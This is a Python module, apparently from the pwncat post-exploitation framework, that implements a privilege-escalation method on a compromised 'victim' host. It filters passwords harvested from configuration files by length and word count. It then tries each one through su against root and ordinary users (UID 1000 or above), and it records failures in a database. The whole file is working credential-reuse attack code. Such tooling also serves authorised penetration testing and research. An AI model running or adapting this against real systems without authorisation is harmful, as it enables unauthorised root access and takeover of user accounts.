#!/usr/bin/env python3
from typing import List

from colorama import Fore
from sqlalchemy.orm.attributes import flag_dirty, flag_modified

from pwncat import util
from pwncat.gtfobins import Capability
from pwncat.privesc import BaseMethod, PrivescError, Technique
import pwncat


class Method(BaseMethod):
    # class Nerfed(BaseMethod):
    """
    Enumerate passwords in configuration files and attempt them on standard
    users (UID >= 1000) and root.

    This restricts enumerated passwords to those with >= 6 characters. Also
    if a password is greater than 15 characters, it cannot contain more than 3 words.
    This rationale is for two reason. Firstly, users who choose passwords
    with spaces normally choose two or three words. Further, automated
    passwords normally do not contain spaces (or at least not many of them).
    """

    name = "configuration-password"
    BINARIES = ["su"]

    def enumerate(self, capability: int = Capability.ALL) -> List[Technique]:
        """
        Enumerate capabilities for this method.

        :param capability: the requested capabilities
        :return: a list of techniques implemented by this method
        """

        # We only provide shell capability
        if Capability.SHELL not in capability:
            return []

        seen_password = []

        techniques = []
        for fact in pwncat.victim.enumerate.iter(typ="configuration.password"):
            util.progress(f"enumerating password facts: {str(fact.data)}")
            if fact.data.value is None:
                continue

            if fact.data.value in seen_password:
                continue

            if len(fact.data.value) < 6:
                continue

            if len(fact.data.value.split(" ")) > 3:
                continue

            for _, user in pwncat.victim.users.items():
                # This password was already tried for this user and failed
                if user.name in fact.data.invalid:
                    continue
                # We already know the password for this user
                if user.password is not None:
                    continue
                if (
                    user.id == 0 and user.name != pwncat.victim.config["backdoor_user"]
                ) or user.id >= 1000:
                    techniques.append(
                        Technique(user.name, self, fact, Capability.SHELL)
                    )

            seen_password.append(fact.data.value)

        util.erase_progress()

        return techniques

    def execute(self, technique: Technique) -> bytes:
        """
        Escalate to the new user and return a string used to exit the shell

        :param technique: the technique to user (generated by enumerate)
        :return: an exit command
        """

        # Escalate
        try:
            pwncat.victim.su(technique.user, technique.ident.data.value)
        except PermissionError as exc:
            # Don't try this again, and mark it as dirty in the database
            technique.ident.data.invalid.append(technique.user)
            flag_modified(technique.ident, "data")
            pwncat.victim.session.commit()
            raise PrivescError(str(exc))

        return "exit\n"

    def get_name(self, tech: Technique) -> str:
        return f"{Fore.YELLOW}possible{Fore.RESET} password ({Fore.BLUE}{repr(tech.ident.data.value)}{Fore.RESET})"
